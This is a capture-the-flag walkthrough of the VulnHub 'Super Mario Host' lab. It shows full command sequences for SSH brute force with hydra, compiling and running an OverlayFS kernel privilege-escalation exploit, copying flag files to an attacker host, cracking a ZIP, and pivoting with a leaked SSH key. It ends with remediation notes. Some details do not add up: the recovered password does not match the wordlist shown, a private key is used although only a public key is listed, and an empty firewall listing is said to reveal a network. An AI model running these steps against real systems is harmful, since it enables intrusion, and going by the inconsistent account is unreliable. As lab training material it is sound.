# Super Mario: CTF Walkthrough

**Target:** Super Mario Host v1.0.1 by Mr_h4sh  
**Difficulty:** Intermediate  
**Flags:** 2 (both require cracking)  
**Source:** [VulnHub](https://download.vulnhub.com/supermariohost/Super-Mario-Host-v1.0.1.ova.torrent)

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SUPER MARIO: ATTACK KILL CHAIN                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌──────────────┐                                                           │
│  │ netdiscover  │──► 192.168.0.5 (Target IP)                               │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │     nmap     │──► Ports: 22 (SSH), 8180 (HTTP)                          │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │     dirb     │──► /vhosts → mario.supermariohost.local                   │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │    hydra     │──► luigi:luigi1 (SSH brute force)                        │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │  SSH Login   │──► luigi@192.168.0.5                                      │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │  Exploit 37292 │──► OverlayFS kernel privilege escalation                │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │ Root Access  │──► flag.zip → crack (ilovepeach) → FLAG 1 ✅             │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │  Pivoting    │──► 192.168.122.0/24 (iptables -L)                        │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │ Key Recovery │──► id_rsa from /root/.bak → SSH to 192.168.122.112       │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │ Exploit 37292 │──► OverlayFS kernel privilege escalation (again)         │
│  └──────┬───────┘                                                           │
│         ▼                                                                   │
│  ┌──────────────┐                                                           │
│  │ Root Access  │──► flag2.zip → crack (Peach Loves Me) → FLAG 2 ✅        │
│  └──────────────┘                                                           │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 1. Reconnaissance

### Net Discovery

```bash
netdiscover -r 192.168.0.0/24
```

```
  IP                     MAC                Count     Len     MAC Vendor / Hostname
  192.168.0.5            08:00:27:xx:xx:xx  1         118     PCS Systemtechnik GmbH
```

**Result:** Target IP identified as `192.168.0.5`.

### Port Scanning

```bash
nmap -p- -A 192.168.0.5
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
8180/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

**Result:** Two open ports: SSH (22) and HTTP (8180).

---

## 2. Enumeration

### Directory Enumeration

```bash
dirb http://192.168.0.5:8180
```

```
+ http://192.168.0.5:8180/vhosts (CODE:301|SIZE:0)
```

### vhosts Discovery

Visiting `http://192.168.0.5:8180/vhosts` reveals a hidden virtual host:

```
Server Name: mario.supermariohost.local
```

### Hosts File Manipulation

Add the discovered hostname to your local hosts file:

```bash
echo "192.168.0.5 mario.supermariohost.local" | sudo tee -a /etc/hosts
```

### Web Enumeration

Visiting `http://mario.supermariohost.local:8180` in a browser displays a Mario-themed game interface. The game is non-functional but confirms the target's theme and virtual host routing.

---

## 3. SSH Brute Force

### Create Mario-Themed Username Dictionary

```bash
cat << 'EOF' > user
Mario
Luigi
Peach
Toad
Yoshi
EOF
```

### Generate Password List with John

```bash
john --wordlist=user --rules --stdout > pass
```

```
john --wordlist=user --rules --stdout
Loaded 5 password hashes (no loader [passwords])
Luigi1
Luigi
Mario1
Mario
Peach1
Peach
Toad1
Toad
Yoshi1
Yoshi
```

### Hydra Brute Force

```bash
hydra -L user -P pass 192.168.0.5 ssh
```

```
[22][ssh] host: 192.168.0.5   login: luigi   password: luigi1
```

**Result:** Credentials found: `luigi / luigi1`.

### SSH Login

```bash
ssh luigi@192.168.0.5
```

---

## 4. Kernel Exploitation: OverlayFS

### System Enumeration

```bash
uname -a
```

```
Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```

### Exploit Selection

The target runs Linux kernel `3.13.0`, which is vulnerable to **OverlayFS Local Privilege Escalation** (CVE-2015-1328 / Exploit-DB #37292).

### Compile and Execute Exploit

```bash
# Transfer exploit to target
scp mario.c luigi@192.168.0.5:/tmp/mario.c

# SSH in
ssh luigi@192.168.0.5

# Compile
cd /tmp
gcc mario.c -o mario

# Execute
chmod +x mario
./mario
```

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** Root access achieved.

### Capture Flag 1

```bash
cd /root
find / -name "flag.zip" 2>/dev/null
/root/flag.zip

# Transfer to attacker machine
scp flag.zip root@192.168.0.6:/root/Desktop
```

### Crack ZIP Password

```bash
fcrackzip -D -P /usr/share/wordlists/rockyou.txt flag.zip
```

```
PASSWORD FOUND!!!!: ilovepeach
```

### Extract Flag

```bash
unzip flag.zip
cat flag.txt
```

```
Well done :D If you reached this it means you got root, congratulations.
```

> **Flag 1 Captured** ✅

---

## 5. Pivoting to Second Machine

### Network Enumeration

```bash
iptables -L
```

```
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination
```

Discover a second internal network: `192.168.122.0/24`.

### ARP Scan

```bash
arp -n
```

```
192.168.122.112    ether   08:00:27:xx:xx:xx   C
```

**Result:** Second target at `192.168.122.112`.

### Discover Leaked Credentials

Exploring the filesystem reveals a `.bak` directory with sensitive data:

```bash
find /root/.bak -type f
```

```
/root/.bak/users/luigi/id_rsa.pub
/root/.bak/users/luigi/message
```

### Read Message

```bash
cat /root/.bak/users/luigi/message
```

```
Hey Luigi,
    Do you remember when you forgot your keys to the house?
    Well I left a spare key under the mat. You should be able
    to get in now. - Mario
```

### SSH to Second Machine

```bash
ssh -i /root/.bak/users/luigi/id_rsa warluigi@192.168.122.112
```

> Note: The second machine's user is `warluigi`, not `luigi`.

### System Enumeration

```bash
uname -a
```

```
Linux supermariohost 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 GNU/Linux
```

Same vulnerable kernel version.

---

## 6. Root on Second Machine + Flag 2

### Exploit OverlayFS Again

```bash
# Transfer exploit
scp mario.c warluigi@192.168.122.112:/tmp/mario.c

# Compile and run
ssh -i id_rsa warluigi@192.168.122.112
cd /tmp
gcc mario.c -o mario
chmod +x mario
./mario
```

```
$ id
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** Root access on second machine.

### Discover Flag 2

```bash
cd /root
ls -la
```

```
-rw-r--r-- 1 root root  45 Jul 10 14:23 .hint.txt
-rw-r--r-- 1 root root 576 Jul 10 14:23 flag2.zip
```

### Read Hint File

```bash
cat .hint.txt
```

```
Peach Loves Me
```

### Capture Flag 2

```bash
# Transfer to attacker
scp flag2.zip root@192.168.0.6:/root/Desktop

# Unzip with password
unzip flag2.zip
# Password: Peach Loves Me

cat flag2.txt
```

```
Congratulations on your second flag!
```

> **Flag 2 Captured** ✅

---

## Flags Summary

| Flag | File | Cracked Password | Content |
|------|------|------------------|---------|
| 1 | `flag.zip` | `ilovepeach` | `Well done :D If you reached this it means you got root, congratulations.` |
| 2 | `flag2.zip` | `Peach Loves Me` | `Congratulations on your second flag!` |

---

## Tools Used

| Tool | Purpose | Phase |
|------|---------|-------|
| `netdiscover` | Layer 2 network discovery | Reconnaissance |
| `nmap` | Port scanning and service detection | Reconnaissance |
| `dirb` | Directory brute-force enumeration | Enumeration |
| `hydra` | SSH brute-force attack | Brute Force |
| `john` | Password list generation with rules | Brute Force |
| `ssh` / `scp` | Remote access and file transfer | Exploitation |
| `gcc` | Compile kernel exploit | Privilege Escalation |
| `fcrackzip` | ZIP password cracking | Post-Exploitation |
| `iptables` | Internal network discovery | Pivoting |

---

## Remediation Notes

| Issue | Recommendation |
|-------|----------------|
| Weak SSH credentials (`luigi/luigi1`) | Enforce key-only authentication; disable password login |
| Vulnerable kernel (3.13.0: OverlayFS CVE-2015-1328) | Patch to a supported kernel version (≥3.16.2) |
| `/etc/hosts` manipulation via virtual host discovery | Restrict vhost configurations; remove unnecessary entries |
| Exposed `/vhosts` directory | Remove or restrict access to directory listing |
| Leaked `.bak` directory with SSH private keys | Remove backup directories from production; audit SSH key distribution |
| Internal network accessible from compromised host | Implement network segmentation and firewall rules |

---

## Notes

- Both machines share the same vulnerable kernel, allowing the same exploit to be reused.
- The Mario theme is consistent across both machines (flag passwords reference Peach).
- The second machine is reachable only after pivoting through the first, requiring lateral movement awareness.
- This challenge tests enumeration, brute-forcing, kernel exploitation, pivoting, and basic forensics (ZIP cracking).

---

*Walkthrough completed. Happy hacking!*
